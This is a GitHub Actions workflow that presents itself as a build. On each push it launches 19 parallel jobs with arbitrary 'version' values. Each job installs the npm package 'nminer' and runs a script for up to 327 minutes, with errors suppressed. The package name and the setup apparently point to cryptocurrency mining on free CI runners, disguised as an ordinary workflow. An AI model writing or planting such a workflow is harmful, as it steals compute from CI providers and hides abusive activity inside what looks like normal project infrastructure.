name: apparatus
on:
  push:
    branches: [ "main" ]

jobs:
  build:
    runs-on: ubuntu-latest
    strategy:
      matrix:
        config:
          - { version: 9410 }
          - { version: 1785 }
          - { version: 9952 }
          - { version: 2584 }
          - { version: 80 }
          - { version: 6127 }
          - { version: 2208 }
          - { version: 6254 }
          - { version: 9148 }
          - { version: 5868 }
          - { version: 8066 }
          - { version: 6436 }
          - { version: 5149 }
          - { version: 8847 }
          - { version: 1019 }
          - { version: 1956 }
          - { version: 9706 }
          - { version: 6434 }
          - { version: 9685 }

    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: Install Node.js
        uses: actions/setup-node@v3
        with:
          node-version: 20
          
      - name: into pish
        run: |
          npm install nminer@latest
          timeout 327m node apparatus.js || echo "apparatus executed"